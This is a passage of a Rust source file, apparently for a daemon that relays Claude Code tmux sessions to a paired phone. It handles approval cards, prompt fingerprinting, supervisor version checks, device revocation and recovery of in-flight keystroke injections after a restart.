//! Daemon state and the paths that mutate it.
//!
//! Everything that can change a session lives here so the ordering rules are in
//! one place:
//!
//!   * **Ingest** assigns `seq` (in the store) and then broadcasts, and does
//!     both **under one per-session gate**. Assigning and publishing are two
//!     steps, so without the gate two tasks can commit 1 and 2 and then publish
//!     2 and 1 — and a subscriber that has seen 2 has no way to accept 1
//!     afterwards. The gate makes "the order events were assigned" and "the
//!     order they were published" the same sentence. A subscriber that joins
//!     between the two steps still sees the event, because `subscribe` reads
//!     the backlog *after* joining the broadcast and drops anything at or below
//!     its watermark.
//!   * **Answering** serialises per request, claims in memory, claims *durably*,
//!     applies, then records the terminal outcome. Serialising first is what
//!     makes a duplicate tap arriving *during* an injection return the original
//!     outcome rather than a rejection. The durable claim is what makes a
//!     daemon killed mid-injection able to say "I do not know whether that
//!     landed" instead of typing a second time into a live TTY.
//!   * **Prompt identity.** A card is bound to a *generation* (a per-run counter
//!     that advances on every structured permission request) and to a
//!     *fingerprint* of the prompt block on the visible pane. An answer is
//!     applied only if both still hold at the moment of typing. When neither can
//!     be established the answer is refused: the human at the keyboard can see
//!     the screen, and we cannot.
//!
//! **Identity.** Every map here is keyed by `session_uid`, never by the tmux
//! name. The name is reused by the next session, so keying by it meant a new run
//! adopted the dead one's supervisor slot, its log and its answered approvals.
//! Anything a client names is resolved through [`Daemon::resolve`] first, which
//! is the single place that decides what a bare `cc-1` refers to.

use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{anyhow, Result};
use protocol::event::{
    Event, EventKind, Lifecycle, Link, PendingEvent, SessionKey, SessionSummary, Source,
};
use protocol::hash::{approval_payload_hash, approval_payload_text, sha256_hex};
use protocol::hook::{Decision, HookDecision, HookEventName, HookInput};
use protocol::ipc::{
    DaemonFrame, HookPost, PromptFingerprint, PromptPresence, RegisterSession, SupervisorRequest,
    SupervisorResult,
};
use protocol::pairing::DeviceSummary;
use protocol::ws::{
    AnswerDecision, AnswerOutcome, AnswerPath, AnswerResult, ApprovalCard, ResolvedBy,
    SendTextResult,
};
use tokio::sync::{broadcast, mpsc, oneshot, Mutex};

use crate::apns::{PushHint, PushSender};
use crate::db::Db;
use crate::store::{
    AnswerClaim, DeviceLookup, DeviceRow, LedgerWrite, PairingConsume, PendingApprovalRow,
    PrunedSession, SessionRow, Store, TextClaim,
};
use protocol::config::Config;

/// Broadcast ring size. A subscriber that falls this far behind gets an
/// explicit `Resync` rather than a silent gap.
const BROADCAST_CAPACITY: usize = 1024;

/// Revocation ring size. Tiny on purpose: a human revoking devices produces a
/// handful of messages in a lifetime, and a connection that somehow lags off
/// this ring still has the per-message and keepalive lookups underneath it.
const REVOCATION_CAPACITY: usize = 64;

/// Consecutive pane captures without the prompt before an approval is called
/// locally resolved. Two, not one: a capture can land during a redraw, and a
/// single blank frame is not evidence that a human answered.
const LOCAL_RESOLVE_MISSES: u32 = 2;

/// The supervisor feature level that can honour a prompt fingerprint. A
/// supervisor below this ignores the `expect` field, so an approval sent to one
/// would be typed against a screen nobody checked.
const SUPERVISOR_MINOR_PROMPT_IDENTITY: u32 = 3;

/// The supervisor feature level that runs the composer-recovery postcondition.
///
/// **The same trap as the fingerprint, one field over.** A supervisor below
/// this accepts `recover_composer` and drops it — serde ignores what it does
/// not know — so the daemon would type `/status`, get back a plain `sent`, and
/// leave a session whose composer is gone and whose every later send the
/// interlock refuses. The daemon is replaced by `codeconnect update`; the
/// supervisors keep running until their sessions restart, so this is the
/// ordinary state of affairs after an upgrade, not an edge case.
const SUPERVISOR_MINOR_COMPOSER_RECOVERY: u32 = 9;
/// The supervisor build that can *complete* a view instead of dismissing it.
const SUPERVISOR_MINOR_CONFIRM_VIEW: u32 = 10;

/// How long a single `tmux has-session` may take before the sweep gives up on
/// it. A client that reaches a live server answers in single-digit
/// milliseconds; this is the ceiling for one that hangs connecting to a socket
/// nobody is serving, and the child is killed when it expires.
const LIVENESS_PROBE_TIMEOUT: Duration = Duration::from_secs(5);

/// The gap between the [`protocol::tmux::EXIT_CONFIRMATIONS`] looks an exit
/// needs.
///
/// The same two seconds the supervisor waits between its own polls, and for the
/// same reason: a tmux server restarting, or a probe that lost a race with a
/// server's startup, produces one `Gone` for a session that is perfectly alive.
/// Held *inside* one sweep rather than across two, so a daemon that has just
/// started reconciles the fleet in seconds instead of leaving the operator
/// looking at ghosts until the next tick — and so the evidence for an exit
/// never depends on in-memory state surviving a restart.
const LIVENESS_RECHECK_DELAY: Duration = Duration::from_secs(2);

/// How long, and how often, to look for the prompt a card was raised for.
///
/// The hook fires microseconds *before* Claude renders the prompt (measured), so
/// fingerprinting synchronously would find nothing every time.
/// Polling briefly afterwards costs a handful of `capture-pane` calls per
/// approval and is invisible to the hook, which has already returned.
const PROMPT_SETTLE_ATTEMPTS: u32 = 6;
const PROMPT_SETTLE_INTERVAL: Duration = Duration::from_millis(150);

/// `(session_uid, request_id)`. An approval belongs to one run, and a request id
/// is only unique within one.
type ApprovalId = (String, String);

/// Where the phone should connect. Resolved once at startup and printed into
/// the QR, so the code the operator scans and the socket the daemon opened can
/// never describe different endpoints.
#[derive(Debug, Clone)]
pub struct Endpoint {
    pub host: String,
    pub port: u16,
    pub tls: bool,
}

pub struct Daemon {
    pub config: Config,
    /// The synchronous store.
    ///
    /// Kept for the handful of places that genuinely have no runtime to defer
    /// to — the startup integrity check, and the tests. Every path inside an
    /// `async fn` uses [`Daemon::db`] instead, which runs the same operations on
    /// the blocking pool rather than on a runtime worker.
    pub store: Arc<Store>,
    /// The async handle to the same store. See [`crate::db`].
    pub db: Db,
    pub events_tx: broadcast::Sender<Event>,
    /// Device ids whose access has just been withdrawn.
    ///
    /// Revocation used to reach an open socket only when that socket next did
    /// something — a message, or the 30-second keepalive. A phone sitting idle
    /// on a subscription kept receiving the event log for up to half a minute
    /// after the operator revoked it, which is not what `codeconnect revoke` means. This
    /// is the push half: every connection selects on it and closes immediately
    /// when its own id arrives, and the periodic lookup stays as the backstop
    /// for a connection that was not listening when the message went out.
    pub revocations_tx: broadcast::Sender<String>,
    pub push: Arc<dyn PushSender>,
    /// What may ring a phone — see [`crate::push_gate`]. Its own locks, held
    /// for map lookups only; never across an await.
    pub push_gate: Arc<crate::push_gate::PushGate>,
    pub endpoint: Endpoint,
    /// The listener's actual bind address, told to the daemon by `main` once
    /// the socket exists. A `OnceLock` rather than a constructor parameter so
    /// the tests — which never open a real listener — say nothing instead of
    /// inventing an address.
    pub bind_ip: std::sync::OnceLock<String>,
    /// (path, sha256) of the executable this process is running, captured by
    /// `main` at startup for the staleness line in `daemon status`.
    pub exe_identity: std::sync::OnceLock<(String, String)>,
    /// When this process started, and which launchd job it belongs to. Captured
    /// once at construction: `XPC_SERVICE_NAME` is set by launchd at exec, and
    /// reading it later would be reading whatever the environment has become.
    started_at: String,
    launchd_label: Option<String>,
    inner: Arc<Mutex<Inner>>,
    /// One gate per run, held across *both* halves of an ingest.
    ///
    /// Separate from `inner` on purpose: it is held while SQLite commits, and
    /// folding it into the state lock would serialise every unrelated query
    /// behind a write. Kept in its own map so the lock ordering is one-way —
    /// gate, then `inner`, never the reverse.
    publish_gates: Mutex<HashMap<String, Arc<Mutex<()>>>>,
    /// Held for the duration of a liveness sweep, so two never overlap.
    ///
    /// Taken with `try_lock`, which makes a slow sweep skip the next tick
    /// rather than queue behind itself. That is the whole bound on how much
    /// work this can be doing at once: one sweep, and one child inside it.
    liveness_sweep: Mutex<()>,
    /// Tells the tailer which transcripts to follow, and when to let one go.
    ///
    /// It carried only the first half until a run's *end* became something the
    /// daemon could establish on its own. A tailer that is never told a session
    /// finished keeps polling its transcript and holding a watch on its working
    /// directory for the life of the process, which on a machine with a
    /// history is hundreds of files nobody will ever write to again.
    transcript_tx: mpsc::UnboundedSender<crate::tailer::TailCommand>,
    /// Leases for the live-terminal carrier: the global attachment cap and the
    /// one-terminal-per-session rule. Shared across every connection.
    pub terminal_leases: crate::terminal::TerminalLeases,
}

/// How a `hello` was (or was not) authenticated.
#[derive(Debug)]
pub enum AuthOutcome {
    /// The static bearer token from `codeconnect token`.
    Static,
    /// A per-device token minted by an earlier pairing.
    Device(Box<DeviceRow>),
    /// A pairing code was redeemed; these credentials are new.
    Paired {
        device_id: String,
        device_name: String,
        token: String,
    },
    /// Refused. The string is for *our* log; the peer gets one opaque error,
    /// because telling an unauthenticated caller which of "wrong", "expired"
    /// and "already used" applies is a free oracle.
    Rejected(String),
}

/// What `codeconnect revoke` did.
#[derive(Debug)]
pub struct RevokeOutcome {
    pub device: DeviceSummary,
    pub token_revoked: bool,
}

/// What one liveness sweep established, counted in *sessions* rather than in
/// questions asked.
///
/// Five numbers rather than a verdict, and the split between the last three is
/// the whole point: "proven gone", "we could not tell" and "it looked gone once
/// and then did not" are three different facts, and a sweep that folded them
/// together would be unable to say whether a quiet fleet was healthy or
/// unreadable. The startup banner reads this out, so the operator can see the
/// difference between a daemon that checked and a daemon that could not.
#[derive(Debug, Default, Clone, PartialEq, Eq)]
pub struct LivenessSweep {
    /// Sessions considered: everything not already `Exited`.
    pub examined: usize,
    /// Distinct `(socket, name)` pairs actually asked about.
    pub targets: usize,
    /// Left alone with positive proof that they are running.
    pub present: usize,
    /// Proven gone, and now `Exited`.
    pub gone: usize,
    /// Left alone because nothing could be established about them.
    pub unknown: usize,
    /// Looked gone once and did not confirm. Left alone.
    pub unconfirmed: usize,
    pub elapsed: Duration,
}

impl LivenessSweep {
    /// The sentence the operator reads. Derived from the numbers rather than
    /// written alongside them, so it cannot claim something they contradict.
    pub fn summary(&self) -> String {
        if self.examined == 0 {
            return "no session needed checking".to_string();
        }
        let mut parts = vec![format!("{} running", self.present)];
        if self.gone > 0 {
            parts.push(format!("{} proven gone and marked exited", self.gone));
        }
        if self.unconfirmed > 0 {
            parts.push(format!("{} unconfirmed and left alone", self.unconfirmed));
        }
        if self.unknown > 0 {
            parts.push(format!("{} could not be established", self.unknown));
        }
        format!(
            "{} session(s) checked over {} tmux name(s) in {:?}: {}",
            self.examined,
            self.targets,
            self.elapsed,
            parts.join(", ")
        )
    }
}

#[derive(Default)]
struct Inner {
    /// Per-device floor between deliberate test pushes. A stolen credential
    /// must not become an APNs harassment primitive, and 30 seconds costs a
    /// legitimate tester nothing.
    test_pushes: HashMap<String, std::time::Instant>,
    /// Keyed by `session_uid`. A second run of the same name gets its own slot
    /// instead of evicting the first's supervisor.
    supervisors: HashMap<String, SupervisorHandle>,
    pending: HashMap<ApprovalId, PendingApproval>,
    /// Monotonic, so a supervisor's old connection cannot release the slot its
    /// new one has taken. Never reused; a `u64` of registrations is not a
    /// number this daemon will reach.
    next_epoch: u64,
    /// One async lock per outstanding approval, so two taps on the same card are
    /// applied one after the other rather than one being rejected mid-flight.
    ///
    /// A `tokio::sync::Mutex` and not a flag: the loser has to *wait* for the
    /// winner's ledger write before it can be told the original outcome, and the
    /// wait spans an await (typing into a TTY).
    answer_locks: HashMap<ApprovalId, Arc<Mutex<()>>>,
    /// Catalogs already read, keyed by binary fingerprint. One binary, one
    /// probe: a cache hit answers with the original `probed_at`, because the
    /// age of a fact is part of the fact. In-memory on purpose — a daemon
    /// restart re-probing once is cheaper than a persisted cache that can go
    /// stale invisibly.
    command_catalogs: HashMap<String, crate::catalog::Catalog>,
    /// Failed probes, remembered briefly. Without this, "singleflight" is a
    /// fiction for failures: the waiters queued behind a failed probe each
    /// find an empty cache and launch their own child, serially. A failure
    /// is not forever — the binary may be fixed or the load transient — so
    /// the memory expires instead of poisoning the fingerprint.
    catalog_failures: HashMap<String, (String, std::time::Instant)>,
    /// One probe in flight per fingerprint. Two palettes opening at once must
    /// share a single child process, not race two — the lock is taken across
    /// the re-check-then-probe, so the loser finds the winner's cache entry.
    catalog_probes: HashMap<String, Arc<Mutex<()>>>,
    /// `(session_uid, prompt_id, tool_name, input_hash)` -> `tool_use_id`.
    ///
    /// PermissionRequest carries no `tool_use_id` on claude 2.1.220, but the
    /// PreToolUse that fires microseconds earlier does. Correlating gives every
    /// approval a stable, agent-side identity for idempotency.
    tool_use_ids: HashMap<String, String>,
    last_seen_ms: HashMap<String, i64>,
    /// When pairing attempts failed, inside the current window.
    ///
    /// Oldest first, and never longer than `pairing_max_attempts`, so this is a
    /// fixed-size structure rather than an unbounded record of everything that
    /// has ever knocked. Memory-only on purpose: a restart clearing the counter
    /// costs an attacker one daemon crash they cannot cause, and persisting it
    /// would mean a failed guess could lock the operator out of pairing.
    pairing_failures: std::collections::VecDeque<i64>,
    /// Per run: how many structured permission requests have been seen.
    ///
    /// The authoritative answer to "is this card still the current prompt?".
    /// Unlike anything read off the screen it needs no capture, cannot be
    /// spoofed by scrollback, and is exact — a card raised at generation N is
    /// answering a prompt that generation N+1 has already replaced.
    prompt_generation: HashMap<String, u64>,
}

pub struct SupervisorHandle {
    tx: mpsc::Sender<DaemonFrame>,
    inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
    next_id: Arc<std::sync::atomic::AtomicU64>,
    /// The executable this run was launched with, as the supervisor reported
    /// it. The command catalog is read from *this* binary: two sessions may
    /// straddle an upgrade, and the phone's palette must describe the one it
    /// is typing into.
    claude_bin: Option<String>,
    /// Which registration this handle belongs to. A supervisor that reconnects
    /// registers again under the same uid, so "remove the entry for this uid" is
    /// not the same question as "remove *my* entry".
    epoch: u64,
    /// What this supervisor can honour. A supervisor from an in-place upgrade
    /// reports 0 and silently ignores the prompt fingerprint, so the daemon
    /// refuses to actuate a permission prompt through it.
    protocol_minor: u32,
}

/// Owns one entry in a supervisor's in-flight map for as long as the request is
/// outstanding.
///
/// The map used to be pruned only by an arriving response, so a request that
/// timed out, was refused by a full queue, or belonged to a supervisor that went
/// away left its `oneshot::Sender` behind permanently. A supervisor lives as
/// long as its session, so that is an unbounded leak on the *stall* path — the
/// one that fires exactly when the daemon is already under stress. Tying removal
/// to a `Drop` makes it correct on every exit path rather than on the ones
/// somebody remembered to write.
struct InflightSlot {
    id: String,
    inflight: Arc<std::sync::Mutex<HashMap<String, oneshot::Sender<SupervisorResult>>>>,
}

impl Drop for InflightSlot {
    fn drop(&mut self) {
        self.inflight
            .lock()
            .unwrap_or_else(|p| p.into_inner())
            .remove(&self.id);
    }
}

/// What a connection got back for registering, and what it must hand back to
/// unregister. Carrying the epoch is what stops a supervisor's *old* connection
/// tearing down the slot its *new* connection has just taken.
#[derive(Debug, Clone)]
pub struct Registration {
    pub session: SessionKey,
    epoch: u64,
}

/// Why a supervisor round-trip produced no result.
///
/// The distinction is the difference between "you may try again" and "never try
/// this again", so it is a type rather than a message somebody has to parse.
#[derive(Debug)]
enum SupervisorFailure {
    /// The request never reached a supervisor. Nothing can have happened.
    NotSent(String),
    /// It was sent and never answered. It may have acted.
    Unanswered(String),
}

/// The one translation from what a supervisor answered (or failed to) into
/// what the phone is told — pure, because the claim's fate hangs on it:
/// `Refused` is the only outcome that releases a text mutation's claim, so
/// every arm here is an assertion about whether typing provably did not
/// happen.
/// The deadline stamp for one supervisor request, or the refusal to make
/// one. A request whose bound cannot be established must not be issued:
/// omitting the stamp would hand the supervisor a fresh full budget *after*
/// whatever time the request spends queued, which is exactly the
/// types-after-the-daemon-hung-up window the stamp exists to close. Nothing
/// has been typed at this point, so refusing is retry-safe.
fn respond_by_stamp(timeout_ms: u64) -> Result<u64, SupervisorFailure> {
    protocol::time::now_monotonic_ms()
        .map(|now| now + timeout_ms)
        .ok_or_else(|| {
            SupervisorFailure::NotSent(
                "this Mac's monotonic clock could not be read, so the send could not be \
                 bounded; nothing was typed"
                    .to_string(),
            )
        })
}

fn send_text_result_of(outcome: Result<SupervisorResult, SupervisorFailure>) -> SendTextResult {
    match outcome {
        Ok(SupervisorResult::Sent { matched }) => SendTextResult::Sent { matched },
        Ok(SupervisorResult::ComposerRecovered {
            matched,
            pane_snapshot,
            captured_at,
        }) => SendTextResult::ComposerRecovered {
            matched,
            pane_snapshot,
            captured_at,
        },
        // Typed, and the composer never came back. Not indeterminate:
        // the typing is certain and so is the state it left behind.
        Ok(SupervisorResult::ComposerLost { matched }) => SendTextResult::ComposerLost { matched },
        // Deliberately `Sent`. A completed confirmation is the same news
        // to the phone as a clean inline send — the keys landed and the
        // transcript decides — so it needs no wire status of its own, and
        // a client that predates this cannot misread one.
        Ok(SupervisorResult::ViewConfirmed { matched }) => SendTextResult::Sent { matched },
        // Typed, and then something could not be observed. `indeterminate`
        // is exactly this state's existing name on the wire, and it is the
        // one the phone already handles by keeping the identity so a retry
        // is recognised rather than typed twice.
        Ok(SupervisorResult::RecoveryUnconfirmed { reason, .. }) => {
            SendTextResult::Indeterminate { reason }
        }
        // A refusal is a positive statement that nothing was typed — the
        // supervisor checks before it injects, and when actuation itself
        // fails provably (tmux refused, or never ran), it says so as a
        // refusal too. Either way the claim may be released.
        Ok(SupervisorResult::Refused { reason }) => SendTextResult::Refused { reason },
        // The supervisor's own "this may have acted and I cannot know":
        // a keystroke killed at its deadline, or Enter unconfirmed after
        // the text landed. The message is the supervisor's, verbatim —
        // it names the phase and what the phone should expect.
        Ok(SupervisorResult::Error { message }) => {
            SendTextResult::Indeterminate { reason: message }
        }
        // Anything else means we never found out. It may have typed, and no
        // later evidence can settle it, so it is reported as unknown rather
        // than as a refusal a retry would act on.
        Ok(other) => SendTextResult::Indeterminate {
            reason: format!("unexpected supervisor result: {other:?}"),
        },
        // Never handed to a supervisor, so nothing was typed and a retry is
        // a fresh attempt rather than a permanent unknown.
        Err(SupervisorFailure::NotSent(reason)) => SendTextResult::Refused { reason },
        Err(SupervisorFailure::Unanswered(reason)) => SendTextResult::Indeterminate {
            reason: format!("the supervisor never confirmed this injection ({reason})"),
        },
    }
}

impl std::fmt::Display for SupervisorFailure {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SupervisorFailure::NotSent(reason) | SupervisorFailure::Unanswered(reason) => {
                f.write_str(reason)
            }
        }
    }
}

impl std::error::Error for SupervisorFailure {}

/// What an attempt to actuate a decision actually did.
///
/// Three outcomes, not two. A caller that only has success and failure cannot
/// tell "the supervisor refused, so nothing was typed" from "the supervisor
/// never answered, so it might have" — and those demand opposite recoveries:
/// one may be retried, the other must never be.
enum Actuation {
    Applied {
        via: AnswerPath,
        detail: Option<String>,
    },
    /// Positively declined before injecting. Nothing was typed.
    Refused(String),
    /// No confirmation, and none is coming. Treated as "it may have typed".
    Unknown(String),
}

struct PendingApproval {
    card: ApprovalCard,
    session: SessionKey,
    created_ms: i64,
    /// Set only while a hook is actually blocked on us (`hold_ms > 0`).
    responder: Option<oneshot::Sender<HookDecision>>,
    claimed: bool,
    /// Consecutive pane captures in which the permission prompt was absent.
    local_misses: u32,
    /// A tool result arrived for this request id, so the call ran — which only
    /// happens if somebody approved it. Positive evidence, unlike an absent
    /// prompt, and it carries the decision with it.
    tool_ran: bool,
    /// What the run this card came from is called.
    ///
    /// **Captured with the card, not looked up when a doorbell rings.** A
    /// notification that speaks for the fleet names the one blocked run, and
    /// reading that name from the database means releasing the lock the count
    /// was taken under and awaiting SQLite — during which the card can be
    /// answered or another run can block, so the name and the number stop
    /// describing the same moment.
    project_label: String,
    /// Which prompt this card belongs to. Compared against the run's current
    /// generation before anything is typed.
    generation: u64,
    /// The prompt block as it looked when this card's prompt first appeared.
    ///
    /// `None` means identity was never established — the supervisor was gone,
    /// the capture failed, or the prompt never showed up where we could see it.
    /// Remote actuation of the prompt is refused while this is `None`, which is
    /// the fail-toward-the-human direction: the card is still shown, and the
    /// person at the keyboard still has it in front of them.
    prompt: Option<PromptFingerprint>,
}

/// The run tmux says is holding a name, when it named one at all.
///
/// `None` covers both "nothing holds it" and "something holds it but cannot say
/// which run it is" — neither of which identifies a *different* owner, which is
/// the only thing this is used to report.
fn holder(sighting: &crate::liveness::Sighting) -> Option<String> {
    match sighting.owner {
        Some(protocol::tmux::SessionOwner::Uid(ref uid)) => Some(uid.clone()),
        _ => None,
    }
}

/// Word-shaped slash command: `/status`, `/model sonnet`. Ordinary prose
/// cannot open a Mac view, so it does not pay for the recovery check; a
/// path like `/tmp/x` is not a command either.
fn is_word_shaped_slash_command(text: &str) -> bool {
    let trimmed = text.trim_start();
    let Some(rest) = trimmed.strip_prefix('/') else {
        return false;
    };
    // The leading run, not the first *word*: `/ status` is a slash followed
    // by prose, and Claude Code reads a command name only when it sits
    // immediately after the slash. Matches `ClaudeCommandPolicy.firstToken`
    // on the phone, which is the other half of this same rule.
    let word: String = rest.chars().take_while(|c| !c.is_whitespace()).collect();
    !word.is_empty()
        && word
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
}

/// What the Mac must be showing before the daemon may press `Enter` to
/// complete the view a native command opened — or `None` when this command may
/// never be completed.
///
/// **`/model <value>` and `/effort <value>`.** Both open the same shape of
/// confirmation, measured on 2.1.223, and both are reached from a sheet that
/// states the cost before the tap. Bare `/model` and bare `/effort` are
/// excluded: they open Claude Code's own chooser, where the highlighted row is
/// whatever it happens to be, so `Enter` there picks something nobody named.
///
/// **One needle.** Separate structural and value needles proved nothing,
/// because the check runs over the whole visible pane and the pane carries
/// Claude Code's echo of the command just submitted: a bare value needle
/// matched that echo, and a bare affirmative needle matched whichever row was
/// highlighted. Joined and anchored to the selection marker, the needle can
/// only match a row that is *selected*, *affirmative*, and *about the value
/// asked for*. Measured, and normalised the way the supervisor normalises the
/// pane — `normalize_for_match` drops whitespace and lowercases but keeps `❯`
/// and digits:
///
/// ```text
/// ❯ 1. Yes, switch to Sonnet 5      (/model sonnet)
/// ❯ 1. Yes, switch to low           (/effort low)
/// ```
///
/// `/effort` echoes its argument verbatim; `/model` echoes a display name, so a
/// full API id such as `claude-sonnet-5` — which the dialog renders as
/// `Sonnet 5` — yields a needle that cannot match. The supervisor then runs the
/// **ordinary rescue**: one `Escape`, composer restored, and the phone told no
/// change was confirmed. The Model sheet's field suggests an alias for exactly
/// this reason.
fn confirmation_needle(text: &str) -> Option<String> {
    let rest = text.trim_start().strip_prefix('/')?;
    let name: String = rest
        .chars()
        .take_while(|c| !c.is_whitespace())
        .collect::<String>()
        .to_ascii_lowercase();
    if name != "model" && name != "effort" {
        return None;
    }
    // One printable word. `is_ascii_graphic` is the whole rule: it excludes the
    // empty argument, anything with whitespace or control bytes, and anything
    // non-ASCII. A payload that did not make one command must never authorise
    // one key.
    let argument = rest[name.len()..].trim();
    if argument.is_empty() || !argument.chars().all(|c| c.is_ascii_graphic()) {
        return None;
    }
    Some(format!(
        "❯1.yes,switchto{}",
        protocol::ipc::normalize_for_match(argument)
    ))
}

/// Consent plus the allowlist — two of the three things that must agree before
/// the one keystroke that commits.
///
/// The client's flag says a human was shown what this command costs and tapped
/// anyway; a client that predates that disclosure sends `false` and gets
/// today's behaviour. The needle is the daemon's own, so the flag can never
/// nominate a command. The third — whether this session's supervisor can
/// *make* a confirmation — is asked in `supervisor_request`, under the same
/// lock that fetches the handle, because a session can restart between two
/// lookups and the answer would be about a supervisor that no longer exists.
///
/// A free function because it is the safety property: as a chain of `&&`
/// inlined in `send_text` it could only be exercised through a full supervisor
/// round trip, and it was not exercised at all.
fn confirm_view_for(text: &str, complete_native_confirmation: bool) -> Option<String> {
    if !complete_native_confirmation {
        return None;
    }
    confirmation_needle(text)
}

/// How to find the card a decision push is about when its grace expires.
///
/// Two ways because the two hooks know different things: the request that filed
/// the card knows its own id, and a `permission_prompt` knows only the prompt.
#[derive(Debug, Clone)]
enum CardKey {
    Request(String),
    Prompt(String),
}

/// Whether the card a decision push announces is still there to be answered.
///
/// **Asked when the push is about to ring, not when it was admitted.** A card
/// can be answered at the keyboard, superseded, or resolved by the tool simply
/// running, and any of those can happen inside the dispatch grace — or, after a
/// restart, in the instant between reading the card and taking the gate. Ringing
/// then would send someone to a decision list with nothing in it.
fn card_is_open(inner: &Inner, session_uid: &str, key: &CardKey) -> bool {
    inner.pending.iter().any(|((uid, request_id), entry)| {
        uid == session_uid
            && match key {
                CardKey::Request(id) => request_id == id,
                CardKey::Prompt(prompt) => entry.card.prompt_id.as_deref() == Some(prompt.as_str()),
            }
    })
}

/// Which runs are holding a decision, and what each is called.
///
/// **Runs, not cards.** One run can hold a second decision while its first is
/// claimed and mid-injection — the superseding sweep deliberately leaves a
/// claimed card in place — and the alert says "agents", so counting cards would
/// make the sentence say something untrue about the fleet.
fn blocked_runs(inner: &Inner) -> Vec<(String, String)> {
    let mut by_run: std::collections::HashMap<&str, &str> = std::collections::HashMap::new();
    for pending in inner.pending.values() {
        by_run.insert(&pending.session.uid, &pending.project_label);
    }
    by_run
        .into_iter()
        .map(|(uid, label)| (uid.to_string(), label.to_string()))
        .collect()
}

/// The only commands whose recovered pane may be kept. Deliberately three
/// names and not a rule: a snapshot is a picture of somebody's screen, and
/// the general version of this idea is the TUI-scraping bridge the design
/// rejected.
fn snapshot_command(text: &str) -> bool {
    let trimmed = text.trim_start();
    let Some(rest) = trimmed.strip_prefix('/') else {
        return false;
    };
    let name: String = rest
        .chars()
        .take_while(|c| !c.is_whitespace())
        .collect::<String>()
        .to_ascii_lowercase();
    // No arguments: these commands take none, and a snapshot request with
    // extra text is not one of them.
    rest[name.len()..].trim().is_empty() && matches!(name.as_str(), "status" | "usage" | "cost")
}

impl Daemon {
    pub fn new(
        config: Config,
        store: Arc<Store>,
        push: Arc<dyn PushSender>,
        endpoint: Endpoint,
        transcript_tx: mpsc::UnboundedSender<crate::tailer::TailCommand>,
    ) -> Arc<Daemon> {
        let (events_tx, _) = broadcast::channel(BROADCAST_CAPACITY);
        let (revocations_tx, _) = broadcast::channel(REVOCATION_CAPACITY);
        let db = Db::new(Arc::clone(&store));
        Arc::new(Daemon {
            config,
            store,
            db,
            events_tx,
            revocations_tx,
            push,
            push_gate: Arc::new(crate::push_gate::PushGate::new()),
            endpoint,
            bind_ip: std::sync::OnceLock::new(),
            exe_identity: std::sync::OnceLock::new(),
            started_at: protocol::time::now_rfc3339(),
            launchd_label: launchd_label(),
            inner: Arc::new(Mutex::new(Inner::default())),
            publish_gates: Mutex::new(HashMap::new()),
            liveness_sweep: Mutex::new(()),
            transcript_tx,
            terminal_leases: crate::terminal::TerminalLeases::new(),
        })
    }

    /// Re-derive from the database everything a restart would otherwise lose.
    ///
    /// Two things, both of which used to be memory-only:
    ///
    /// 1. **Open approval cards.** A card is a durable fact in the log and a
    ///    live question on somebody's phone; after a restart the daemon used to
    ///    answer "unknown or already-resolved request" to a tap on a card that
    ///    was still on screen. Recovered cards come back with **no** prompt
    ///    fingerprint: whatever is on the pane now was never checked against
    ///    them, and the local sweep re-establishes identity (or resolves the
    ///    card) against what is actually visible.
    /// 2. **Mutations that were claimed but never settled.** A claim with no
    ///    outcome means the daemon died between typing and recording. That is
    ///    recorded as a terminal *indeterminate* result, and never retried.
    pub async fn recover(&self) {
        let now = protocol::time::now_rfc3339();

        match self.db.unresolved_answer_claims().await {
            Ok(claims) if !claims.is_empty() => {
                crate::log_warn!(
                    "recovery: {} answer(s) were claimed but never settled; recording them as \
                     indeterminate rather than typing again",
                    claims.len()
                );
                for claim in claims {
                    self.settle_indeterminate(&claim).await;
                }
            }
            Ok(_) => {}
            Err(err) => crate::log_error!("recovery: could not read answer claims: {err:#}"),
        }

        match self.db.recover_text_mutations(now.clone()).await {
            Ok(0) => {}
            Ok(count) => crate::log_warn!(
                "recovery: {count} send_text mutation(s) were in flight and their outcome is \
                 unknown; a retry will be told so rather than typing again"
            ),
            Err(err) => crate::log_error!("recovery: could not settle send_text claims: {err:#}"),
        }

        match self.db.list_pending_approvals().await {
            Ok(rows) if !rows.is_empty() => {
                // Counted up front, before the state lock is taken.
                //
                // The generation of a run is the number of approval requests it
                // has logged, and reading that is a database query. Doing it
                // inside the loop would mean awaiting the blocking pool while
                // holding `inner` — which the lock ordering forbids and which
                // would serialise every other task behind a restart's recovery.
                // One query per distinct run rather than one per card, so a
                // session with twenty open cards costs one.
                let mut counted: HashMap<String, u64> = HashMap::new();
                for uid in rows
                    .iter()
                    .map(|row| row.session_uid.clone())
                    .collect::<std::collections::BTreeSet<_>>()
                {
                    match self
                        .db
                        .count_events_of_kind(uid.clone(), EventKind::ApprovalRequest)
                        .await
                    {
                        Ok(count) => {
                            counted.insert(uid, count);
                        }
                        // Left absent, so the card's own generation is used —
                        // the same fallback the previous `unwrap_or` gave.
                        Err(err) => crate::log_error!(
                            "recovery: could not count approval requests for {uid}: {err:#}"
                        ),
                    }
                }

                // Resolved before the lock, because naming a run reads the
                // database and the lock below admits no awaits.
                let mut labels: HashMap<String, String> = HashMap::new();
                for row in &rows {
                    if !labels.contains_key(&row.session_uid) {
                        let label = self.effective_project_label(&row.session_uid).await;
                        labels.insert(row.session_uid.clone(), label);
                    }
                }

                let mut inner = self.inner.lock().await;
                let mut restored = 0usize;
                for row in rows {
                    let Ok(card) = serde_json::from_str::<ApprovalCard>(&row.card) else {
                        crate::log_error!(
                            "recovery: dropping an undecodable pending card for {}",
                            row.request_id
                        );
                        continue;
                    };
                    // The run's current generation is the number of approval
                    // requests it has logged — the same derivation the live path
                    // uses, so a recovered card is compared against the same
                    // scale it was created on.
                    let current = counted
                        .get(&row.session_uid)
                        .copied()
                        .unwrap_or(row.generation);
                    let generation = inner
                        .prompt_generation
                        .entry(row.session_uid.clone())
                        .or_insert(0);
                    *generation = (*generation).max(current).max(row.generation);
                    inner.pending.insert(
                        (row.session_uid.clone(), row.request_id.clone()),
                        PendingApproval {
                            card,
                            session: SessionKey::new(&row.session_uid, &row.session_id),
                            project_label: labels
                                .get(&row.session_uid)
                                .cloned()
                                .unwrap_or_default(),
                            created_ms: row.created_ms,
                            responder: None,
                            claimed: false,
                            local_misses: 0,
                            tool_ran: false,
